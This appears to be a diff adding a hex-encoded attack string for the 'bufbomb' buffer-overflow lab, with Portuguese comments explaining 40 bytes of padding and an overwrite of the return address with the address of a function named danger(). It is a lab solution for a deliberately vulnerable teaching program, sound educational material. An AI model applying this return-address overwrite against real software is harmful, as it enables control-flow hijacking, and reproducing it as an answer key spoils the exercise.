@@ -1,0 +1,13 @@
+/* String invasora para bufbomb - sobrescreve return address com endereço de danger() */
+/* 40 bytes de preenchimento (buf[32] + saved_rbp[8]) */
+/* Seguidos por endereço de danger (0x401206) em little-endian */
+
+/* Preenchimento: 40 bytes (pode ser qualquer valor, usando 00) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Endereço de danger (0x0000000000401206) em little-endian */
+06 12 40 00 00 00 00 00
